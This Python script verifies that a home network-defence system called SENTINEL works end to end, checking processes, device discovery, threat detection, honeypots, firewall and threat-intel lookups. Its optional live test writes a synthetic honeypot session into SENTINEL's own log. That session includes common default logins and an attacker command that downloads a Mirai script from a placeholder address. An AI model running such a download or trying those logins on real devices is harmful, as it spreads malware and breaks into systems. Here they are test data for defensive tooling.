#!/usr/bin/env python3
"""
SENTINEL — End-to-End System Verification

Checks what is *actually* working, layer by layer, and reports honestly.
A check only passes when it is backed by real evidence; anything that
cannot be confirmed is reported as UNKNOWN rather than assumed working.

    python3 verify_system.py              # read-only checks
    python3 verify_system.py --live-test  # also inject a synthetic threat
                                          # and simulate a honeypot session

--live-test writes test data into the registry and honeypot logs so you can
watch it appear in the dashboard. It only ever touches SENTINEL's own files
and never sends traffic to any third party.
"""

from __future__ import annotations

import argparse
import json
import subprocess
import sys
import time
import urllib.error
import urllib.request
import uuid
from datetime import datetime, timedelta
from pathlib import Path

ROOT = Path(__file__).parent
API = "http://localhost:8000"

PASS, FAIL, WARN, INFO = "PASS", "FAIL", "WARN", "INFO"

_ICON = {PASS: "\033[32m✓\033[0m", FAIL: "\033[31m✗\033[0m",
         WARN: "\033[33m!\033[0m", INFO: "\033[36m·\033[0m"}

results: list[tuple[str, str, str]] = []


def check(status: str, name: str, detail: str = "") -> None:
    results.append((status, name, detail))
    print(f"  {_ICON[status]} {name}")
    if detail:
        for line in detail.splitlines():
            print(f"      {line}")


def section(title: str) -> None:
    print(f"\n\033[1m{title}\033[0m")


def get(path: str, timeout: float = 8.0):
    """GET a JSON endpoint. Returns (data, error)."""
    try:
        with urllib.request.urlopen(f"{API}{path}", timeout=timeout) as r:
            return json.loads(r.read().decode()), None
    except urllib.error.HTTPError as e:
        return None, f"HTTP {e.code}"
    except Exception as e:
        return None, str(e)


def proc_count(pattern: str) -> int:
    try:
        out = subprocess.run(["pgrep", "-cf", pattern], capture_output=True,
                             text=True, timeout=5).stdout.strip()
        return int(out or 0)
    except Exception:
        return 0


# ── Layer checks ─────────────────────────────────────────────────

def check_processes() -> None:
    section("Layer 0 — Processes")

    expected = {
        "Redis":            "redis-server",
        "Backend API":      "uvicorn api.main",
        "Packet capture":   "sentinel.core.capture.main",
        "Discovery agent":  "sentinel.core.fingerprinting.discovery",
        "Anomaly worker":   "sentinel.agents.anomaly.worker",
        "Classifier worker": "sentinel.agents.classifier.worker",
        "Responder worker": "sentinel.agents.responder.worker",
    }

    for label, pattern in expected.items():
        n = proc_count(pattern)
        if n == 0:
            check(FAIL, f"{label} not running", f"No process matching: {pattern}")
        elif label == "Packet capture" and n > 8:
            # One engine spawns several workers; far more means leaked copies.
            check(WARN, f"{label} running ({n} processes)",
                  "That looks like duplicate engines. Run: bash stop.sh")
        elif label != "Packet capture" and n > 1:
            check(WARN, f"{label} running ({n} copies)", "Duplicate instances detected.")
        else:
            check(PASS, f"{label} running")


def check_api() -> None:
    section("Layer 7 — API")

    health, err = get("/api/health")
    if err:
        check(FAIL, "API unreachable", f"{API} — {err}\nStart it with: bash run.sh")
        return
    check(PASS, "API responding", f"version {health.get('version', '?')}")

    net, err = get("/api/network/current")
    if err:
        check(FAIL, "Network endpoint missing", f"{err} — API may be running old code; restart it.")
    elif not net.get("current"):
        check(WARN, "No network detected", "No default route, or gateway MAC unresolved.")
    else:
        c = net["current"]
        check(PASS, "Network identity",
              f"{c['subnet']} via {c['gateway_ip']} on {c['interface']}\n"
              f"network_id (gateway MAC) = {c['network_id']}")
        check(INFO, f"{len(net.get('known_networks', []))} network(s) known to the registry")


def check_devices() -> None:
    section("Layer 1/2 — Capture & Discovery")

    devices, err = get("/api/devices")
    if err:
        check(FAIL, "Devices endpoint failed", err)
        return

    if not devices:
        check(WARN, "No devices on the current network",
              "Discovery may still be warming up (ARP sweep runs every ~45s),\n"
              "or this network isolates clients from each other.")
        return

    online = [d for d in devices if d.get("is_online")]
    check(PASS, f"{len(devices)} device(s) on current network", f"{len(online)} online")

    # Devices must belong to the current subnet — a public IP here means the
    # flow parser mis-attributed a remote endpoint as local hardware.
    net, _ = get("/api/network/current")
    subnet = (net or {}).get("current", {}).get("subnet") if net else None
    if subnet:
        import ipaddress
        network = ipaddress.ip_network(subnet, strict=False)
        strays = []
        for d in devices:
            ip = d.get("ip") or ""
            try:
                if ":" not in ip and ipaddress.ip_address(ip) not in network:
                    strays.append(f"{ip} ({d.get('vendor') or 'unknown'})")
            except ValueError:
                continue
        if strays:
            check(FAIL, f"{len(strays)} device(s) outside {subnet}",
                  "\n".join(strays) + "\nThese are not local hardware.")
        else:
            check(PASS, f"All device IPs inside {subnet}")

    with_cve = [d for d in devices if d.get("cve_list")]
    if with_cve:
        check(PASS, f"CVE enrichment working ({len(with_cve)} device(s) have CVEs)")
    else:
        check(WARN, "No CVE data on any device",
              "NVD lookups may be timing out (slow internet) or vendors unidentified.")


def check_detection() -> None:
    section("Layer 3 — Threat Detection Pipeline")

    status, err = get("/api/detection/status")
    if err:
        check(FAIL, "Detection status unavailable",
              f"{err} — restart the API to pick up this endpoint.")
        return

    if not status.get("worker_online"):
        check(FAIL, "Anomaly worker not reporting", status.get("detail", ""))
        return

    state = status["state"]
    detail = (f"{status['devices_ready']}/{status['devices_seen']} devices ready · "
              f"{status['packets_processed']} packets · window={status['window_size']}")

    if state == "active":
        check(PASS, "Detection active — all devices analysed", detail)
    elif state == "warming_up":
        check(INFO, f"Detection warming up ({int(status['progress'] * 100)}%)", detail)
    else:
        check(WARN, "Waiting for traffic", detail)

    threats, err = get("/api/threats")
    if err:
        check(FAIL, "Threats endpoint failed", err)
    else:
        check(INFO if not threats else PASS,
              f"{len(threats)} threat(s) on current network",
              "Empty is correct on a clean network — use --live-test to inject one."
              if not threats else "")


def check_honeypots() -> None:
    section("Layer 4 — Honeypots")

    hp, err = get("/api/honeypots/status")
    if err:
        check(FAIL, "Honeypot endpoint failed", err)
        return

    for key in ("cowrie", "opencanary"):
        h = hp.get(key, {})
        state = h.get("status", "UNKNOWN")
        name = h.get("name", key)
        ip = h.get("ip", "?")

        if state == "ONLINE":
            check(PASS, f"{name} running", f"IP {ip}")
        elif state == "OFFLINE":
            check(WARN, f"{name} not deployed",
                  f"Container '{'sentinel-' + key}' is not running.\n"
                  f"Deploy with: cd deception && sudo docker compose up -d")
        elif state == "STANDBY":
            check(WARN, f"{name} has data but is not running", f"IP {ip}")
        else:
            check(WARN, f"{name} state unknown",
                  "Docker could not be queried (not installed, or needs sudo).")

    sessions, err = get("/api/honeypots/sessions")
    if err:
        check(FAIL, "Honeypot sessions endpoint failed", err)
        return

    if sessions:
        creds = sum(len(s.get("login_attempts", [])) for s in sessions)
        breached = [s for s in sessions if s.get("success")]
        check(PASS, f"{len(sessions)} honeypot session(s) recorded",
              f"{creds} credential attempt(s), {len(breached)} successful login(s)")
    else:
        check(INFO, "No honeypot sessions yet",
              "Expected until an attacker connects, or use --live-test.")


def check_firewall() -> None:
    section("Layer 5 — Firewall")

    rules, err = get("/api/firewall/rules")
    if err:
        check(FAIL, "Firewall endpoint failed", err)
        return

    enabled = [r for r in rules if r.get("enabled")]
    check(PASS if rules else INFO,
          f"{len(rules)} firewall rule(s), {len(enabled)} enabled")

    nft = subprocess.run(["which", "nft"], capture_output=True, text=True)
    if nft.returncode == 0:
        check(PASS, "nftables binary available", nft.stdout.strip())
    else:
        check(WARN, "nftables not installed",
              "Rules are stored in the registry but cannot be enforced on this host.")


def check_intel() -> None:
    section("Layer 6 — Threat Intelligence")

    data, err = get("/api/intel/8.8.8.8", timeout=20)
    if err:
        check(WARN, "Intel lookup failed", f"{err} — slow internet or missing API keys.")
        return

    if data.get("otx_pulse_count") or data.get("abuse_score"):
        check(PASS, "Intel enrichment working",
              f"OTX pulses={data.get('otx_pulse_count')} · AbuseIPDB={data.get('abuse_score')}%")
    else:
        check(WARN, "Intel returned empty",
              "Check OTX_API_KEY / ABUSEIPDB_API_KEY in .env, or slow connection.")


# ── Live test (writes data) ──────────────────────────────────────

def live_test() -> None:
    section("LIVE TEST — injecting synthetic data")
    print("  Writes into SENTINEL's own registry and honeypot log only.\n")

    sys.path.insert(0, str(ROOT))
    from sentinel.core.fingerprinting.registry import DeviceRegistry
    from sentinel.core.network_identity import detect_current_network
    from sentinel.config.settings import settings

    identity = detect_current_network()
    if identity is None:
        check(FAIL, "No network detected — cannot tag test data")
        return

    reg = DeviceRegistry(settings.db_url)

    # 1. Synthetic threat, tagged to the current network so it shows up in
    #    the scoped Threats tab.
    devices = reg.get_devices_for_network(identity.network_id)
    device_id = devices[0].device_id if devices else "dev_testdevice"
    event_id = f"TEST-{uuid.uuid4().hex[:8]}"

    reg.add_threat_event(
        event_id=event_id,
        device_id=device_id,
        tactic="Discovery",
        technique_id="T0842",
        confidence=0.93,
        severity=8,
        summary="[VERIFY] Synthetic port-scan pattern injected by verify_system.py",
        indicators=[identity.gateway_ip],
        network_id=identity.network_id,
    )
    check(PASS, "Injected synthetic threat",
          f"event_id={event_id} → should appear in the Threats tab")

    # 2. Synthetic Cowrie session in the real log format the parser reads.
    log_dir = ROOT / "deception" / "cowrie" / "log"
    try:
        log_dir.mkdir(parents=True, exist_ok=True)
        sid = uuid.uuid4().hex[:12]
        now = datetime.utcnow().isoformat() + "Z"
        events = [
            {"eventid": "cowrie.session.connect", "session": sid,
             "src_ip": "203.0.113.77", "timestamp": now},
            {"eventid": "cowrie.login.failed", "session": sid,
             "username": "root", "password": "123456", "timestamp": now},
            {"eventid": "cowrie.login.failed", "session": sid,
             "username": "admin", "password": "admin", "timestamp": now},
            {"eventid": "cowrie.login.success", "session": sid,
             "username": "root", "password": "root", "timestamp": now},
            {"eventid": "cowrie.command.input", "session": sid,
             "input": "uname -a", "timestamp": now},
            {"eventid": "cowrie.command.input", "session": sid,
             "input": "wget http://203.0.113.99/mirai.sh", "timestamp": now},
            {"eventid": "cowrie.session.closed", "session": sid,
             "duration": 42.7, "timestamp": now},
        ]
        with open(log_dir / "cowrie.json", "a") as f:
            for e in events:
                f.write(json.dumps(e) + "\n")
        check(PASS, "Injected synthetic honeypot session",
              f"session={sid} from 203.0.113.77 (TEST-NET-3)\n"
              "→ should appear in the Honeypots tab with captured credentials")
    except PermissionError:
        check(FAIL, "Cannot write Cowrie log",
              f"{log_dir} is root-owned. Run: sudo chown -R $USER {log_dir}")

    print("\n  Waiting 3s for the API to pick it up…")
    time.sleep(3)

    threats, _ = get("/api/threats")
    if threats and any(t.get("event_id") == event_id for t in threats):
        check(PASS, "Threat visible via API — pipeline confirmed end-to-end")
    else:
        check(WARN, "Injected threat not visible yet", "Try refreshing the dashboard.")

    sessions, _ = get("/api/honeypots/sessions")
    if sessions:
        check(PASS, f"Honeypot sessions visible via API ({len(sessions)})")
    else:
        check(WARN, "Honeypot session not visible yet")

    print("\n  \033[33mCleanup:\033[0m")
    print(f"    sqlite3 data/sentinel.db \"DELETE FROM threat_events WHERE event_id LIKE 'TEST-%';\"")
    print(f"    rm {log_dir / 'cowrie.json'}")


def main() -> int:
    parser = argparse.ArgumentParser(description="Verify SENTINEL end to end")
    parser.add_argument("--live-test", action="store_true",
                        help="Inject a synthetic threat and honeypot session")
    args = parser.parse_args()

    print("\n\033[1m  SENTINEL — System Verification\033[0m")
    print(f"  {datetime.now():%Y-%m-%d %H:%M:%S}")

    check_processes()
    check_api()
    check_devices()
    check_detection()
    check_honeypots()
    check_firewall()
    check_intel()

    if args.live_test:
        live_test()

    # Summary
    counts = {s: sum(1 for r, _, _ in results if r == s) for s in (PASS, FAIL, WARN, INFO)}
    print("\n" + "─" * 60)
    print(f"  \033[32m{counts[PASS]} passed\033[0m · "
          f"\033[31m{counts[FAIL]} failed\033[0m · "
          f"\033[33m{counts[WARN]} warnings\033[0m · "
          f"{counts[INFO]} info")

    if counts[FAIL]:
        print("\n  \033[31mFailures:\033[0m")
        for status, name, _ in results:
            if status == FAIL:
                print(f"    • {name}")
        print("\n  Most failures are fixed by: bash stop.sh && bash run.sh")
    print()

    return 1 if counts[FAIL] else 0


if __name__ == "__main__":
    sys.exit(main())
